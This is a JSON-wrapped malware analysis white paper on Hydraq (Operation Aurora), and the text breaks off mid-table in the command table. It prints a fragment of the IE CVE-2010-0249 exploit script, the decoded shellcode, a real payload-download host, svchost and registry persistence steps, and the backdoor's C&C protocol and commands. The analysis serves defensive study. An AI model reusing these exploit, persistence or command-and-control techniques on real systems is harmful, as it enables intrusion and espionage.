{
    "id": "f10e7a54-8126-4bba-835e-707c3e179336",
    "created_at": "2022-10-25T16:48:22.683668Z",
    "updated_at": "2025-03-27T02:16:49.050296Z",
    "deleted_at": null,
    "sha1_hash": "6eb3094ecab54a8b80932f4bec263696f849ca77",
    "title": "In-Depth Analysis Of Hydraq: The Face Of Cyberwar Enemies Unfolds",
    "authors": "CA",
    "file_creation_date": "2010-03-12T14:37:26Z",
    "file_modification_date": "2010-03-12T14:37:26Z",
    "file_size": 1662677,
    "plain_text": "## In-depth Analysis of Hydraq\n\n###### The face of cyberwar enemies unfolds\n\n Zarestel Ferrer and Methusela Cebrian Ferrer CA ISBU Senior Researchers, Melbourne Australia \n\n Abstract\n\nThere are thousands of undetected online threats and malware attacks from around the world\nevery day. Most of these attacks take place in cyberspace, where unsuspecting people fall prey to\nvarious forms of cybercrime. Common cyber criminal activity involves stealing sensitive information such as credit card details, online login credentials, browsing history and email addresses.\nHowever, notable skilled attacks occur when the target is in possession of highly-valuable information that could be leveraged as a weapon for warfare.\n\n_Hydraq is a family of threats used in highly sophisticated, coordinated attacks against large and_\nhigh-profile corporate networks. It is referred to as Operation Aurora, _Google Hack Attack and_\n\n_Microsoft Internet Explorer 0-day (CVE-2010-0249). An in-depth code investigation and analysis_\n\nwill highlight _Hydraq features and capabilities, and as it unfolds, questions will unravel on to_\nwhether the discovery of this threat is just the beginning of a global arms race against cyberwarfare.\n\n\n-----\n\n# Table of Contents\n\n**Introduction** **3**\n\n**Anatomy of an Attack** **4**\n\n**1. How Hackers Gain Access** **5**\n\n1.1 Reconnaissance 5\n\n1.2 0Day Hack Attack 5\n\n1.3 MS10-002 (CVE-2010-049) Analysis 5\n\n1.4 Hydraq Binary Shellcode 7\n\n**2. How Hackers Maintain Access** **9**\n\n2.1 Win32/Hydraq (EXE) Dropper: Generating Random Service 9\n\n2.2 Win32/Hydraq (DLL) Backdoor: Method of Installation 10\n\n**3. Cyber Spy In Control** **11**\n\n3.1 Initialization of the Backdoor Configuration 11\n\n3.2 Command and Control 11\n\n3.3 Backdoor Configuration: Resource Section and Registry Key 12\n\n3.4 Backdoor Communication Protocol 0x00: Establishing Communication 13\n\n3.5 Backdoor Communication Protocol 0x01: Execution of Client-Server Commands 17\n\n3.6 Backdoor Command Reference 19\n\n3.7 Backdoor Command Table 21\n\n3.9 Backdoor Commands In Action 24\n\n**Summary** **28**\n\n**Safe Computing Habits** **29**\n\n**Appendix A - Other variant method of installation** **31**\n\n**Appendix B - Initial Handshake** **33**\n\n**Appendix C - Customize Character Decoding** **33**\n\n**Appendix D - Real-time Graphical Control** **35**\n\n**Appendix E - Domain Name List** **36**\n\n**Reference** **37**\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 2\n\n\n-----\n\n# Introduction\n\n_“In mid-December, we detected a highly sophisticated and targeted attack on our corporate_\n_infrastructure originating from China that resulted in the theft of intellectual property from Google._\n\n_... we have evidence to suggest that a primary goal of the attackers was accessing the Gmail_\n_accounts of Chinese human rights activists.”_\n\nThis statement was taken from a Google blog post entitled \"A new approach to China\"[[1]], in which\nGoogle declared its decision to stop censoring its search results in China.\n\n_Internet freedom vs cyber crime is a deep issue that crosses all boundaries; and the same brought_\nglobal debate about internet censorship and human rights [[2]].\n\nThis incident prompted authorities and world leaders to discuss and work on matters of cyber\ncrime; taking into consideration that cyber threats may affect national security [[3]].\n\nThe report _“Tracking GhostNet: Investigating a Cyber Espionage Network”[ [4]] as published last_\nyear, highlights cyberwarfare as a major global concern.\n\nEvidently, an increasing wealth of online information and resources will attract attackers. For highprofile threats such as Hydraq, it is important to understand the underlying attack technique and its\ntechnical details.\n\nThis paper seeks to explore and discover the level of skill the attackers employed to successfully\ndeploy this highly sophisticated attack.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 3\n\n\n-----\n\n###### Anatomy of an Attack\n\nReconnaissance Internet activity\n\n### [Attacker] [Target User]\n\n\nDeploying attacks IE 0-day Exploit Attack (CVE-2010-049)\n\n\n**Remote Shellcode APIs**\n\n\nshell32.SHGetSpecialFolderPathA\n\nurlmon.URLDownloadToFileA\n\n...kernel32.CreateFileA\n\n...kernel32.GetFileSize\n\n// decrypt downloaded file\n\n...kernel32.CreateFileA\n\n...kernel32.SetFilePointer\n\n...kernel32.ReadFile\n\n...kernel32.WriteFile\n\n...kernel32.CloseHandle\n\n...kernel32.CloseHandle\n\n...kernel32.DeleteFileA\n\n...kernel32.MultiByteToWideChar\n\n// Execute Win32/Hydraq dropper\n\nkernel32.CreateProcessInternalW\n\n\nReconnaissance Internet activity\n\nDeploying attacks IE 0-day Exploit Attack (CVE-2010-049)\n\n\n**Win32/Hydraq allows remote attacker gain control.**\n\n### [Attacker] [Target User]\n\ncovert communication channel\n\ntransmission of sensitive information\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 4\n\n|R ying e c o n n t a r i a attacks s c s n o s a v n e m c r i I Win32/Hydraq t e s E s c i 0 o o - n d m allow a s o m y f u s re E n e x i m n c p o s a i lo te t t i i i t o v I e n A t n i c t t n a h attack e f c e a r o r k r n n ( g n e m C t e a l V ain t a i E c o - t i n 2 cont v 0 r i 1 t ol 0 . y - 0 4 9 )|Col2|\n|---|---|\n\n\n**Win32/Hydraq allows remote attacker gain control.**\n\ncovert communication channel\n\ntransmission of sensitive information\n\n\n**Win32/Hydraq allows remote attacker gain control.**\n\ncovert communication channel\n\n\ncovert communication channel\n\n\n-----\n\n###### 1. How Hackers Gain Access\n\n 1.1 Reconnaissance\n\nProfiling the target is a basic principle of hacking. This refers to a reconnaissance phase where\nthe attacker evaluates and determine ways to launch a successful attack.\n\nReconnaissance with Whois, DNS and IP/Network could provide preliminary information about\nthe target organization’s infrastructure. In addition, a combination of social engineering and\nphysical (on-site) reconnaissance is also considered as a valuable source of information.\n\nTo learn more about the target, attackers performs passive and active scanning to understand\nthe target network topology, platforms, ports and services, vulnerabilities and security defenses.\n\nThe profiling also extends to people that have knowledge and access to the target organization\nincluding employees, contractors, and visitors. Cyber reconnaissance is very useful in this case,\ngathering detailed information through social networking sites and tracing digital footprints\nthrough search engine results. Attackers could compromise the “circle of trust” of the target, including friends, family members and even internet browsing habits can be analyzed to successfully gain access.\n\n###### 1.2 0Day Hack Attack\n\n_Hydraq exploits the zero-day (0day) vulnerability in Internet Explorer, which is referred to as_\nCVE-2010-0249 [[5]] and MS10-002 [[6]].\n\nIn reconnaissance stage, Hydraq masterminds have been able to devise a plan for successful\nhacking attack. Evidently, the authors found an opportunity to target Internet Explorer and evade\nsecurity detection through an unknown vulnerability.\n\nSophisticated social engineering tricks can then be deployed to entice target users to visit a\ncompromised web site.\n\n###### 1.3 MS10-002 (CVE-2010-049) Analysis\n\nIt is a common characteristic for attackers to obfuscate malicious JavaScript to conceal the\ncode’s real intentions and also avoid detection by security scanners [Listing 01].\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 5\n\n\n-----\n\n**OBFUSCATED** **DeOBFUSCATED**\n\n**< Shellcode >**\n\n**< Exploit Code >**\n\n[Listing 01 - Hydraq JavaScript (JS/Hydraq) distributed for targeted attack]\n\nIn general use, obfuscation is designed for code protection regardless of whether the intentions\nare good or bad.\n\n_Hydraq’s malicious JavaScript contains code that takes advantage of Internet Explorer (IE)_\nHTML object handling flaw and is triggered when IE tries to access a deleted or incorrectly initialized HTML object. [Listing 02]\n\nOnce the exploit attack is successful, Hydraq’s binary shellcode will then execute on the target\nsystem.\n```\n   var e1=null;\n   function ev1(evt)\n   {\n    e1=document.createEventObject(evt);\n    document.getElementById(\"sp1\").innerHTML=\"\";\n    window.setInterval(ev2, 50);\n   } \n   function ev2()\n   {  \n   p=\"\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\\n   u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0\n   d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0\n   c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\"\n   ;\n   for(i=0;i<x1.length;i++){x1[i].data=p;};\n   var t=e1.srcElement;\n   }\n\n```\n[Listing 02 - JS/Hydraq IE exploit routine]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 6\n\n\n**< Shellcode >**\n\n**< Exploit Code >**\n\n\n-----\n\n###### 1.4 Hydraq Binary Shellcode\n\nAs shown in Listing 01, Hydraq binary shellcode is u% encoded. A simple bitwise XOR encryption\n\nand 0xD8 as the key, will reveal the hidden instruction.\n```\n            <html><script> var\n            sc=unescape(\"%u9090%u19eb%u4b5b%u3\n            390%u90c9%u7b80%ue901%u0175%u66c3%\n      01012475 > $ 90       NOP\n      01012476  . 90       NOP\n      01012477  . EB 19     JMP SHORT calc.01012492\n      01012479  $ 5B       POP EBX\n      0101247A  . 4B       DEC EBX\n      0101247B  . 90       NOP\n      0101247C  . 33C9      XOR ECX,ECX\n      0101247E  . 90       NOP\n      0101247F  . 807B 01 E9   CMP BYTE PTR DS:[EBX+1],0E9\n      01012483  . 75 01     JNZ SHORT calc.01012486\n      01012485  . C3       RETN\n      01012486  > 66:B9 7B04   MOV CX,47B\n      0101248A  > 80340B D8   XOR BYTE PTR DS:[EBX+ECX],0D8\n      0101248E  .^E2 FA     LOOPD SHORT calc.0101248A\n      01012490  . EB 05     JMP SHORT calc.01012497\n      01012492  > E8 E2FFFFFF  CALL calc.01012479\n\n```\n[Listing 03 - The shellcode is injected to calc.exe for this analysis]\n\nA quick string inspection of the decrypted code shows that it contains Win32/Hydraq installer\nlocation, as shown below:\n```\n 00000440: 74 57 66 0D-FF 43 BE AC-DB 98 0A 10-F8 80 D6 AF tWf?†C+º¶ˇ??∞«+ª\n 00000450: 9A FB 53 15-66 68 74 74-70 3A 2F 2F-64 65 6D 6F ‹vSßfhttp://demo\n 00000460: 31 2E 66 74-70 61 63 63-65 73 73 2E-63 63 2F BC 1.ftpaccess.cc/+\n\n```\n[Listing 04 - Decrypted strings from shellcode]\n\n_Hydraq shellcode contains instructions that will download encrypted file from the internet. The_\n\nencrypted file is Hydraq’s installer which is stored at `%Document and Settings%\\<user-`\n```\nname>\\Application Data\\a.exe\n\n```\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 7\n\n\n-----\n\n|Shellcode APIs Once downloaded, it decrypts the file a.exe by performin shell32.SHGetSpecialFolderPathA // XOR operation using 0x95 as its key; it skips bytes equal t urlmon.URLDownloadToFileA .|Col2|Col3|\n|---|---|---|\n||||\n\n\n...kernel32.CloseHandle\n\nThe decrypted file is saved to b.exe in the same directory and the file a.exe\n\n...kernel32.DeleteFileA\n\nis deleted to avoid discovery.\n\n...kernel32.MultiByteToWideChar\n\n// Install Win32/Hydraq dropper\n\nkernel32.CreateProcessInternalW\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 8\n\n\n-----\n\n###### 2. How Hackers Maintain Access\n\nOnce the exploit attack is successful, the attacker will attempt to install a backdoor to maintain\naccess. In this case, the downloaded executable from the internet is a dropper component of\n_Hydraq (Win32/Hydraq dropper)._\n\nThe Win32/Hydraq dropper is responsible for the installation of the DLL component, which contains all the features and functionalities for Hydraq’s remote attacker. (see Appendix A for other\nvariants methods of installation)\n\n###### 2.1 Win32/Hydraq (EXE) Dropper: Generating Random Service\n\n2.1.1 Method of Installation\n\n1. Upon execution, Win32/Hydraq dropper generates a random service name in the following format:\n```\n              Ups<3 random characters>\n\n```\n2. It drops the DLL component from its resource to %System%\\Rasmon.dll.\n\n3. It adds the generated service name to the registry entry below:\n```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\SysIns\n\n```\n4. It then creates and starts a service with the following characteristics detailed below. This\nenables the DLL component to be executed under the context of the generic host process, Svchost.exe.\n```\n   ServiceName = \"Ups<3 random characters>\"\n   DesiredAccess = SERVICE_ALL_ACCESS\n   ServiceType = SERVICE_WIN32_SHARE_PROCESS\n   StartType = SERVICE_AUTO_START\n   ErrorControl = SERVICE_ERROR_NORMAL\n   BinaryPathName = \"%SystemRoot%\\System32\\svchost.exe -k SysIns\"\n\n```\n2.1.2 Deleting Traces of Installation\n\n1. Win32/Hydraq dropper’s job is to install the DLL component and remove its installation\n\ntraces in the registry to avoid forensic discovery. The data added in the registry key below is deleted:\n```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\SysIns\n\n```\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 9\n\n\n-----\n\n2. Furthermore, as part of clearing its traces on a compromised system, the dropper component creates and executes a batch file in %Windows%\\DFS.bat. Its primary goal is to delete\n\nthe Win32/Hydraq dropper file (b.exe).\n\n###### 2.2 Win32/Hydraq (DLL) Backdoor: Method of Installation\n\n2.2.1 Method of Installation\n\nOnce the ”Ups<3 random characters>” service starts to execute, it will run Win32/Hydraq\n\nDLL under the generic host process, Svchost.exe. The DLL component will then perform the following actions:\n\n1. It checks the service name it is running on. It performs a case sensitive comparison on\n\nthe first three characters of the service name “Ras”. If it is not the same, it stops the\n\nservice operation and deletes the current service. It then registers a new service name in\nthe following format: ”RaS”<random 4 characters>\n\nThis behavior suggests that Win32/Hydraq DLL changes its service name every time an infected\nsystem is rebooted, or the service is restarted. The malware will never have a service name\nstarting with ”Ras” due to the fact that it generates a service name starting with ”RaS” (Take\n\nnote of the case sensitive comparison).\n\n2. The DLL component creates a service with the following characteristics:\n```\n   ErrorControl: SERVICE_ERROR_IGNORE\n   Start: SERVICE_AUTO_START\n   Type: SERVICE_WIN32_SHARE_PROCESS\n   ImagePath: %SystemRoot%\\System32\\svchost.exe -k netsvcs\n\n```\n3. Similar to the Win32/Hydraq dropper, the DLL component takes advantage of the available\nprivileges running under the context of trusted Windows system processes. It adds the following registry entry as a parameter to the newly created service.\n```\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\RaS<4 random char   acters>\\Parameters\\ServiceDll = %system%\\Rasmon.dll\n\n```\n4. In addition, the DLL component also adds an entry of its service name in the following registry entry below.\n```\n   HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersions\\Svchost\\netsvcs\n\n```\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 10\n\n\n-----\n\n###### 3. Cyber Spy In Control\n\n 3.1 Initialization of the Backdoor Configuration\n\nThe attackers behind Hydraq maintain access by installing the Win32/Hydraq DLL component.\nOnce installed, the backdoor will start to initialize the configuration needed to perform its functionalities.\n\nThe configuration file is encrypted and stored in the resource section of the DLL file. To decode\nit, Win32/Hydraq DLL employs the following steps:\n\n1. Decryption using bitwise XOR with 0x99 as the key.\n\n2. Customized character decoding (see Appendix C).\n3. Decryption using bitwise XOR with 0xAB as the key.\n\nTake note that some variants of Hydraq do not store the configuration in the resource file. These\nvariants reference the registry entry `HKLM\\Software\\Sun\\1.1.2\\AppleTlk for the remote`\n\nconnection information. The data found in the key can be decoded using the customized character decoding logic as specified (see Appendix C).\n\n3.1.1 Using an Interactive Service\n\nThe Win32/Hydraq DLL backdoor component is installed and running under the context of\nSvchost.exe, which is a system process. This service is non-interactive and cannot interact with\nthe user or access GUI objects. To enable the interactive service, the backdoor will perform the\nfollowing:\n\n1. Assign the default desktop object to the Win32/Hydraq DLL thread.\n2. Assign the winstat0 window station to the Win32/Hydraq DLL process.\n\nThese actions enable access to GUI objects.\n\n###### 3.2 Command and Control\n\nWin32/Hydraq contains an encoded backdoor configuration in the file’s resource section. Once decoded it uses this information to communicate with the Command and Control (C&C) server.\n\nThe first information accessed in the configuration is the C&C server hostname, which can be\nfound at offset 0x00 until the null delimiter.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 11\n\n\n-----\n\n[Listing 05 - Win32/Hydraq decoded resource]\n\n###### 3.3 Backdoor Configuration: Resource Section and Registry Key\n\nThe Win32/Hydraq backdoor configuration determines the parameters to enable the remote attacker recognize and gain control of the affected system. The configuration is stored in the: File\nResource Section, and/or in a Registry Key.\n\n3.3.1 File’s Resource Section\n\nAs shown in Listing 05, the Win32/Hydraq backdoor configuration is stored in the resource section\nof the file. It retrieves the specified hostname, and attempts to establish a remote connection.\nHowever, to perform this task, the backdoor needs to resolve the specified hostname. Based on\nthe code, the backdoor checks the hostname IP address if it is a valid IPv4 Internet address (for\nexample, 111.222.123.111). If it is not, it will retrieve the hostname IP address using an avail\nable DNS.\n\nThe backdoor connects to 168.95.1.1 using port 53 as an alternate DNS to resolve the server\n\naddress. This stand-by solution is only valid in the next 5 minutes from the time the backdoor accesses the alternate DNS server.\n\n3.3.2 In the Registry Key\n\nThe backdoor also checks the registry key HKLM\\Software\\Sun\\1.1.2\\AppleTlk. The value\n\ncontained in this key is encoded information about the remote connection details.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 12\n\n\n-----\n\nIf the registry key exist, it will decode the value using the following steps:\n\n  - Perform a bitwise XOR with 0x99 as the key on each byte.\n\n  - Perform the same custom decoding logic it used in the configuration found in file’s resource\nsection.\n\nThe updated configuration is always stored in the registry. The backdoor will then retrieve the\nspecified hostname and alternate DNS to establish a remote connection. It checks the hostname\nIP Address if it is a valid IPv4 Internet address. If it is not, it retrieves the hostname IP address using an available DNS. If the backdoor cannot resolve the hostname IP address, it will sleep for two\nminutes and attempt to resolve the IP address using an available DNS again (see Listing 06).\n\nIf the registry key HKLM\\Software\\Sun\\1.1.2\\ does not exist, the backdoor continues the con\nnection using the configuration specified from the backdoor resource section. Take note that the\npriority configuration used is always from the registry key next is the configuration from the resource.\n\n[Listing 06 - Win32/Hydraq reconnects after 2 minutes]\n\n###### 3.4 Backdoor Communication Protocol 0x00: Establishing Communication\n\n\nIn the context of discussing the backdoor functionalities, we will refer to the following terms as\nfollows:\n\nClient or remote server - is defined as the remote attacker.\nServer - is defined as the system where the Win32/Hydraq backdoor is installed.\n\n\nAs soon as the server’s IP address is resolved, the server attempts to initiate a connection to the\nclient and a 3-way handshake process is performed:\n\n3.4.1 SYNchronize\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 13\n\n\n-----\n\nThe client sends a custom SYNchronize packet containing the following 20 bytes as initial hand\nshake.\n```\n    FF FF FF FF FF FF 00 00 FE FF FF FF FF FF FF FF FF FF 88 FF\n\n```\nThe set of bytes above are encrypted using a bitwise NOT operation. Thus, the raw set of bytes is\n\nthe following:\n```\n     00 00 00 00 00 00 FF FF 01 00 00 00 00 00 00 00 00 00 77 00\n\n```\nAs shown in Listing 07, the Win32/Hydraq backdoor\ncode includes a routine that constructs the 20 byte\nSYNchronization packet that is sent to the client.\n\nThe initial handshake was captured during a test\nsimulation performed in a controlled environment as\nshown in Appendix B. The backdoor uses port 443\n\nto connect to the server. Port 443 is the known default\nport for the HTTPS protocol.\n\nHowever, in this case, the Win32/Hydraq backdoor did\nnot take advantage of the available SSL/TLS encryption to secure its communication to the client. The information contained in the packet is evidently showing\nthe set of bytes constructed by the malware.\n\n\n3.4.2 SYNchronize-ACKnowledgement\n\n\n[Listing 07 - Constructing Initial Handshake routine ]\n\n\nThe client will identify the initial SYN packet sent by the server. If valid, the client will respond a\nSYNchronize ACKnowledgement packet 20 bytes in size. The sets of bytes are encrypted using a\nbitwise XOR with 0xCC as the key.\n```\n     CC CC CC CC CD CC CC CC CD CC CC CC CC CC CC CC AA AA AA AA\n\n```\n[Listing 08 - Acknowledgment data decryption routine ]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 14\n\n\n-----\n\nThe server will validate the SYN-ACK packet from the client expecting the following decrypted values:\n```\n    00 00 00 00  01 00 00 00  01 00 00 00  00 00 00 00 00 00 00 00\n\n```\nTake note that,\n```\nOffset 0x00 must be equal to 0x0000\nOffset 0x04 must be equal to 0x0001\nOffset 0x08 must be equal to 0x0001\nOffset 0x0C must be equal to 0x0000\n\n```\n3.4.3 ACKnowledge\n\nOnce the server receives the expected SYN-ACK\npacket, it will respond by sending an ACKnowledgement\nof receipt. The following tasks are performed:\n\na. Collect the following information from the compromised system.\n\n - Computer name\n\n - CPU clock speed\n\n - Memory status – specifically gets the amount of actual physical memory in bytes and converts it to megabytes.\n\n - Operating system information\n\n[ Listing 09 - Collected system information ]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 15\n\n\n-----\n\nb. Encrypt the information collected using a custom encryption were the key used is derived from\n\nthe result of GetTickCount API. The encrypted data will be encrypted again using a bitwise NOT.\n\nc. Generate a CRC hash value of the encrypted information.\nd. Send the collected information to the client.\n\n###### Header Information\n\n Encrypted Information collected in the system\n\n[Listing 10 - Constructed message from the server]\n\n[Listing 11 - Captured packet received by the client]\n\nThe server is now ready to accept backdoor commands from the remote attacker.\n\nThe complete 3-way handshake process between the backdoor server and the client will look like\nthis:\n\n[Listing 12 - The backdoor 3-way handshake process]\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 16\n\n\n###### Header Information\n\n Encrypted Information collected in the system\n\n\n-----\n\n**3.5 Backdoor Communication Protocol 0x01: Execution of Client-Server Commands**\n\nDuring the 3-way handshake process, we discovered that the Win32/Hydraq backdoor constructs a\ncustom packet. This is a communication protocol designed so that the client and server can recognize each other over the network. The information header format is different from each end point.\n\n3.5.1 Client’s Information Header Format\n\n[Figure 1 - The client process the server information header.]\n\nThe constructed information header is 20 bytes in size in the following format: (Note: The values in\n_Table 01 are for illustration purpose only)_\n\n**Client Command** **Task** **Start / End** **Size of Data** **Data** **Data**\n**Reference (DWORD)** **(DWORD)** **Flag (DWORD)** **sent (DWORD)** **CRC** **Encryption Key**\n\n**(WORD)** **(WORD)**\n```\n00 00 00 00 02 00 00 00 01 00 00 00 B0 00 00 00 75 53 A1 00\n\n```\n[Table 01 - Client’s Information Header Format]\n\nThe client’s Command Reference and Task will be discussed in the section “Backdoor Command\nReference”. It is important to take note that the information from the server is encrypted using a\nbitwise NOT, while the information from the client is encrypted using a bitwise `XOR with` `0xCC as`\n\nthe key. (see Listing 12)\n\n**Fields** **Offset** **Description**\n\nClient Command Reference 0x00 This field is a reference used for identifying the\ngroup of a specific backdoor command.\n\nTask 0x04 This field contains the code used to identify which\nbackdoor instruction to execute.\n\nStart / End 0x08 This field is a flag that signals the receiver start (1)\nor end (-1) of data.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 17\n\n|Client Command Reference (DWORD)|Task (DWORD)|Start / End Flag (DWORD)|Size of Data sent (DWORD)|Data CRC (WORD)|Data Encryption Key (WORD)|\n|---|---|---|---|---|---|\n|00 00 00 00|02 00 00 00|01 00 00 00|B0 00 00 00|75 53|A1 00|\n\n|Fields|Offset|Description|\n|---|---|---|\n|Client Command Reference|0x00|This field is a reference used for identifying the group of a specific backdoor command.|\n|Task|0x04|This field contains the code used to identify which backdoor instruction to execute.|\n|Start / End|0x08|This field is a flag that signals the receiver start (1) or end (-1) of data.|\n\n\n-----\n\n|Fields|Offset|Description|\n|---|---|---|\n|Data Size|0x0C|This field contains the size of the encrypted data included in transmission.|\n|Data CRC|0x10|A CRC value computed based on the encrypted data. This field is used for integrity checking of the encrypted data.|\n|Data Encryption|0x12|It is a word value used as the decryption key for the encrypted data. This field is used to preserve the confidentiality of the encrypted data.|\n|Encrypted Data|0x14|This offset contains the encrypted data being transmitted to the client or server.|\n\n\n[Table 02 - Information Header Definition]\n\n3.5.2 Server’s Information Header Format\n\n[Figure 02 - The client process the server information header.]\n\nThe constructed information header is 20 bytes in size with the following format. (Note: The values\n_in Table 03 are for illustration purpose)_\n\n**Server Information** **Server** **Start / End** **Size of Data** **Data** **Data**\n**Reference (DWORD)** **Information** **Flag (DWORD)** **sent (DWORD)** **CRC** **Encryption Key**\n\n**Code** **(WORD)** **(WORD)**\n**(DWORD)**\n```\n00 00 00 00 02 00 00 00 01 00 00 00 B0 00 00 00 75 53 A1 00\n\n```\n[Table 03 - Server's Information Header Format]\n\nThe difference between the client and server header information is the Server Info Reference (offset 0x00) and Information Code (offset 0x04). Based on our simulation and code inspection, the\n\nbackdoor client uses the following numeric codes to identify the content of the received information: (Note: The Backdoor Command and Task is discussed in section _Backdoor Command Table)_\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 18\n\n|Server Information Reference (DWORD)|Server Information Code (DWORD)|Start / End Flag (DWORD)|Size of Data sent (DWORD)|Data CRC (WORD)|Data Encryption Key (WORD)|\n|---|---|---|---|---|---|\n|00 00 00 00|02 00 00 00|01 00 00 00|B0 00 00 00|75 53|A1 00|\n\n\n-----\n\n|Server IInnffoorrmmaattiioonn Reference|Server Information Code (expected values)|Backdoor|Col4|Type of Information Note: The client expects the following action or information below from the server.|\n|---|---|---|---|---|\n|||Command|Task||\n|0x00|0x03|0x02|0x00|Receive arbitrary file|\n|0x00|0x04|0x04|0x08|Write received data to file|\n|0x00|0x05|0x04|0x09|Read file information|\n|0x00|0x06|0x07|0x0B|Receive VedioDriver|\n|0x02|0x00|0x00|0x00|Process list|\n|0x02|0x01|0x00|0x01|Terminated process|\n|0x03|0x00|0x01|0x00|Service list|\n|0x05|0x00|0x03|0x00|Enumerated registry keys|\n|0x05|0x01|0x03|0x01|Registry keys|\n|0x05|0x02|0x03|0x02|Deleted registry info|\n|0x05|0x06|0x03|0x06|Deleted key info|\n|0x06|0x00|0x04|0x00|Logical drive info|\n|0x06|0x01|0x04|0x01|Searched file information|\n|0x06|0x07|0x04|0x07|Filenames in a directory|\n|0x08|0x06|0x05|0x06|File CRC|\n|0x09|0x01|0x06|0x01|File information|\n|0x09|0x02|0x06|0x02|Header only|\n|0x0C|0x02|0x08|0x00|Header only|\n|0x14|0x04|0x09|0x01|Network.ics|\n\n\n[Table 04 - Server Information Header Definition]\n\n**3.6 Backdoor Command Reference**\n\nAside from the malware code obfuscated with JMPs and NOPs, Win32/Hydraq also constructs a\nreference table that will be used by the Command Reference field found in the client’s information header to convert the actual commands.\n\nOnce the server receives a packet from the client, it performs the following task to convert the\nclient’s Command Reference value:\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 19\n\n\n-----\n\n1. Perform a bitwise `XOR with 0xCC as the key in`\n\nthe information transmitted.\n2. The value in the Command Reference field will\n\nbe added with negative two (-2).\n3. Match the value obtained in Step 2 in the Table\n\n05 to get the Actual Command.\n\nTo elaborate on this further, let’s take an example\nwhere the remote attacker requests information\nabout the logical drive of the compromised system.\n\nIn Table 05, the Command Reference for retrieving\nthe logical drive is Command 0x04. (see Table 06\n\nfor Backdoor Command and Task reference)\n\nIn this example, the Command Reference is CA CC\n```\nCC CC, and the Task Number is CC CC CC CC.\n\n```\nConverting the correct instruction to execute:\n```\n1.0xCCCCCCCA XOR 0xCCCCCCCC = 6\n\n```\n|Command Reference|Backdoor Command|\n|---|---|\n|0x00|0x00|\n|0x01|0x01|\n|0x02|0x02|\n|0x03|0x03|\n|0x04|0x04|\n|0x05|0x0A|\n|0x06|0x05|\n|0x07|0x06|\n|0x08|0x07|\n|0x09|0x0A|\n|0x0A|0x08|\n|0x0B|0x0A|\n|0x0C|0x0A|\n|0x0D|0x0A|\n|0x0E|0x0A|\n|0x0F|0x0A|\n|0x10|0x0A|\n|0x11|0x0A|\n|0x12|0x09|\n\n```\n2.6 + (-2) = 4\n\n```\n3. Resulting match:\n\n\n[Table 05 - Backdoor Command Reference]\n\n|Command Reference|Backdoor Command|\n|---|---|\n|0x04|0x04|\n\n\nListing 13 displays the captured communication between the client and server retrieving the logical drive information of the compromised system.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 20\n\n\n-----\n\n[Listing 13 - Captured client server communication ]\n\n###### 3.7 Backdoor Command Table\n\nThe Win32/Hydraq backdoor features 10 command switches, which theoretically allow the remote attacker to perform almost everything. An attacker can manipulate files, registries, services, process, privileges, search files and directories, remote download, update configurations,\nopen applications, and steal any desired information. Attackers can initiate real-time graphical\ncontrol and watch a user’s desktop using `Command 0x07 Task 0x0b (see Appendix D for`\n\ndiscussion of acelpvc.dll and VedioDriver.dll installation).\n\n**Backdoor** **Task** **Description**\n\n**Command**\n\n`Command 0x00` `Task 0x00` Adjust Token Privilege / Access Privilege Escalation and Enumerate\n\nProcess.\n\n`Task 0x01` Terminate Process\n\n`Other value` Receive further commands.\n```\n         (Task 0x02 or more)\n\n```\n`Command 0x01` `Task 0x00` Enumerate service configuration and sends back to the client.\n\nCA ISBU ISI WHITE PAPER IN DEPTH ANALYSIS OF HYDRAQ 21\n\n|Backdoor Command|Task|Description|\n|---|---|---|\n|Command 0x00|Task 0x00|Adjust Token Privilege / Access Privilege Escalation and Enumerate Process.|\n||Task 0x01|Terminate Process|\n||Other value (Task 0x02 or more)|Receive further commands.|\n|Command 0x01|Task 0x00|Enumerate service configuration and sends back to the client.|\n\n\n-----\n\n|Col1|Task 0x01|Modify or change service configuration. Predefined Start type: 2-SERVICE_AUTO_START, 3- SERVICE_DEMAND_START, 4-SERVICE_DISABLED|\n|---|---|---|\n||Task 0x02|Start or stop a service.|\n||Task 0x03|Delete a service.|\n||Other value (Task 0x04 or more)|Receive further commands.|\n|Command 0x02|Task 0x00|Execute a new thread to perform the 